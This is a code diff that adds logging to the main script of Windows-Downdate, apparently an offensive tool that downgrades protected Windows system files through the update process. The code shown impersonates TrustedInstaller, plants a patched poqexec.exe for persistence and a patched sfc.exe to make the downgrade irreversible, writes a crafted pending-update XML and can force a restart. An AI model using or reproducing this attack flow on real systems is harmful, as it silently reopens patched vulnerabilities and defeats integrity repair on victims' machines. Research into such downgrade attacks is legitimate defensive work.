@@ -13,10 +13,8 @@ from windows_downdate.update_utils import pend_update, get_empty_pending_xml
 from windows_downdate.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
     append_child_element, ET
 
+
 logger = logging.getLogger(__name__)
-
-
-# TODO: Add logs
 
 
 def parse_args() -> argparse.Namespace:
@@ -94,6 +92,7 @@ def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
         hardlink_dict = update_file.to_hardlink_dict()
         hardlink_element = create_element("HardlinkFile", hardlink_dict)
         append_child_element(poq_element, hardlink_element)
+        logger.info(f"{update_file.destination_path_obj.full_path} <<-->> {update_file.source_path_obj.full_path}")
 
     return downgrade_xml
 
@@ -103,13 +102,17 @@ def main() -> None:
     init_logger()
     args = parse_args()
 
+    logger.info("Starting Windows-Downdate")
+
     if not is_administrator():
         raise Exception("Windows-Downdate must be run as an Administrator")
 
     update_files = parse_config_xml(args.config_xml)
+    logger.info("Parsed config file")
 
     if args.elevate:
         impersonate_trusted_installer()
+        logger.info("Impersonated TrustedInstaller")
 
     if args.invisible:
         raise NotImplementedError("Not implemented yet")
@@ -119,21 +122,33 @@ def main() -> None:
         poqexec_path_obj = Path("C:\\Windows\\System32\\poqexec.exe")
         poqexec_update_file_obj = UpdateFile(patched_poqexec_path_obj, poqexec_path_obj)
         update_files.append(poqexec_update_file_obj)
+        logger.info("Added patched PoqExec to update files for persistence")
 
     if args.irreversible:
         patched_sfc_path_obj = Path(f"{cwd}\\resources\\SFC\\sfc.exe")
         sfc_path_obj = Path("C:\\Windows\\System32\\sfc.exe")
         sfc_update_file_obj = UpdateFile(patched_sfc_path_obj, sfc_path_obj)
         update_files.append(sfc_update_file_obj)
+        logger.info("Added patched SFC to update files for irreversible")
 
     retrieve_oldest_files_for_update_files(update_files)
+    logger.info(f"Retrieved oldest files for non-existent update files")
+
     downgrade_xml = craft_downgrade_xml(update_files)
     downgrade_xml_path = f"{cwd}\\Downgrade.xml"
     downgrade_xml.write(downgrade_xml_path)
+    logger.info(f"Written downgrade XML to disk: {downgrade_xml_path}")
+
     pend_update(downgrade_xml_path)
+    logger.info("Pended update with downgrade XML")
 
     if args.force_restart:
         restart_system(args.restart_timeout)
+        logger.info(f"System restart in {args.restart_timeout}")
+    else:
+        logger.info("You must manually restart the system for the update to take effect")
+
+    logger.info("Ending Windows-Downdate")
 
 
 if __name__ == '__main__':
